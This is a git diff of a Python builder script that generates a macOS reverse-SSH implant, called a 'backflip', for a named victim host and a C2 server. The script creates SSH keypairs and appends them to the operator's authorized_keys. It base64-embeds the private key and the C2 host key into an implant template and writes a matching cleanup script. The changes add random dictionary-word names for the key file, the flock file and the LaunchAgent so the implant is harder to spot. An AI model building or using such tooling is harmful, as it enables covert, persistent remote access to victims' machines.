@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 
 import os
+import subprocess
+import random
 import sys
 import base64
 from io import StringIO
@@ -8,6 +10,10 @@ import re
 import uuid
 
 logging = True
+backflipsBaseDir = "/opt/backflips"
+keysDir = f"{backflipsBaseDir}/keys"
+payloadsDir = f"{backflipsBaseDir}/payloads"
+cleanupScriptsDir = f"{backflipsBaseDir}/cleanup"
 
 def usage():
     print ("usage: %s <username> <victim_host> <c2_fqdn/ip> <port> <remoteport>" % sys.argv[0])
@@ -34,6 +40,13 @@ def nocomments(stuff):
             o += l
     return o
 
+def getrandomwords(howmany:int):
+    cleanwords = []
+    wordlist = getfile("/usr/share/dict/words") 
+    dirtywords = random.sample(wordlist.splitlines(), howmany)
+    for word in dirtywords:
+        cleanwords.append(word.replace("'s", "").lower())
+    return cleanwords
 
 
 def main():
@@ -43,26 +56,38 @@ def main():
         sys.stderr.write("you must use sudo\n")
         sys.exit(1)
 
+    # Check for a source of words for the names generator.
+    if not os.path.exists("/usr/share/dict/words"):
+        sys.stderr.write("'/usr/share/dict/words' not found. You need to install a dictionary with 'apt install wamerican'\n")
+        sys.exit(1)
+
+    if not os.path.exists(payloadsDir):
+        print(f"[*] backflips directory '{backflipsBaseDir}'not found, creating it now...")
+        os.makedirs(f"{keysDir}")
+        os.makedirs(f"{payloadsDir}")
+        os.makedirs(f"{cleanupScriptsDir}")
+
     username = sys.argv[1]
     victim_hostname = sys.argv[2]
     fqdn = sys.argv[3]
     port = sys.argv[4]
     remoteport = sys.argv[5]
-
+    payloadkeyname = "".join(getrandomwords(2))
+    flockfilename = "".join(getrandomwords(1))
+    lagentname = f"com.{'.'.join(getrandomwords(2))}.worker"
     
     print ("[*] victim host: %s" % victim_hostname)
     print ("[*] fqdn: %s" % fqdn)
     print ("[*] port: %s" % port)
 
-    KEYPATH = f"/opt/backflips/keys/{username}-{victim_hostname}-{fqdn}"
-    print (f"[*] keypath: {KEYPATH}")
+    KEYPATH = f"{keysDir}/{username}-{victim_hostname}-{fqdn}"
     print ("[*] generating keypair")
     os.system(f"ssh-keygen -t rsa -b 2048 -C '' -q -f '{KEYPATH}' -N ''")
     print ("[*] adding to flip's authorized keys")
-    os.system("echo '' >> /opt/backflips/authorized_keys")
-    os.system(f"cat '{KEYPATH}.pub' >> /opt/backflips/authorized_keys")
-    os.system(f"echo \"{fqdn} $(ssh-keyscan -p {remoteport} -t ed25519 localhost 2>/dev/null | cut -d ' ' -f2-)\">/opt/backflips/keys/serverpub.pub")
-    backstring= getfile("/opt/backflips/keys/serverpub.pub")
+    os.system(f"echo '' >> {backflipsBaseDir}/authorized_keys")
+    os.system(f"cat '{KEYPATH}.pub' >> {backflipsBaseDir}/authorized_keys")
+    os.system(f"echo \"{fqdn} $(ssh-keyscan -p {remoteport} -t ed25519 localhost 2>/dev/null | cut -d ' ' -f2-)\">{keysDir}/serverpub.pub")
+    backstring= getfile(f"{keysDir}/serverpub.pub")
     backencode = backstring.encode("utf-8")
     backkey = base64.b64encode(backencode)
     pubstring = getfile(KEYPATH+ ".pub")
@@ -72,27 +97,38 @@ def main():
     privencoded = privstring.encode("utf-8")
     privkey = base64.b64encode(privencoded)
     implant_py = getfile(os.path.join(sys.path[0], "loadssh_template.sh"))
-    cleanup_py = getfile(os.path.join(sys.path[0],"cleanup.py"))
+    cleanup_py = getfile(os.path.join(sys.path[0], "cleanup.py"))
     implant = templify(implant_py, {
         "PORT_PLACEHOLDER" : port,
         "REMOTE_PLACEHOLDER": remoteport,
         "FQDN_PLACEHOLDER" : fqdn,
         "PRIVATE_KEY_PLACEHOLDER" : privkey.decode("utf-8"),
         "PUBLIC_KEY_PLACEHOLDER" : pubkey.decode("utf-8"),
-        "BACKFLIP_PUB_PLACEHOLDER":backkey.decode("utf-8"),
+        "BACKFLIP_PUB_PLACEHOLDER" : backkey.decode("utf-8"),
+        "PRIVATE_KEY_PATH_PLACEHOLDER" : payloadkeyname,
+        "FLOCK_NAME_PLACEHOLDER" : flockfilename,
+        "LAGENT_NAME_PLACEHOLDER" : lagentname,
         })
     implant_clean = templify(cleanup_py,{
         "PUBLIC_KEY_PLACEHOLDER" : pubkey.decode("utf-8"),
-        "BACKFLIP_PUB_PLACEHOLDER":backkey.decode("utf-8"),
+        "BACKFLIP_PUB_PLACEHOLDER" : backkey.decode("utf-8"),
+        "PRIVATE_KEY_PATH_PLACEHOLDER" : payloadkeyname,
+        "FLOCK_NAME_PLACEHOLDER" : flockfilename,
+        "LAGENT_NAME_PLACEHOLDER" : lagentname,
     })
-    filename = str(uuid.uuid4())
 
-    with open(KEYPATH+filename+'_cleanup.py','w') as file2:
+    implantName = f"{username}-{victim_hostname}-{fqdn}-{str(uuid.uuid4())}"
+    with open(f"{cleanupScriptsDir}/{implantName}_cleanup.py", 'w') as file2:
         file2.write(implant_clean)
-    with open(KEYPATH+filename,'w') as file:
+    with open(f"{payloadsDir}/{implantName}", 'w') as file:
         file.write(implant)
-    print (f"[+] The mac backflip is located @ {KEYPATH}{filename}")
 
+    print(f"[+] Backflip keypath: {KEYPATH}")
+    print(f"[+] The mac backflip payload is located @ {payloadsDir}/{implantName}")
+    print(f"[+] The mac backflip cleanup script is located @ {cleanupScriptsDir}/{implantName}_cleanup.py")
+    print(f"[I] The implant private key will be named '{payloadkeyname}' instead of badger")
+    print(f"[I] The FLock will be named '{flockfilename}.pl'")
+    print(f"[I] The LaunchAgent will be named '{lagentname}'")
 
 if __name__ == "__main__":
     main()
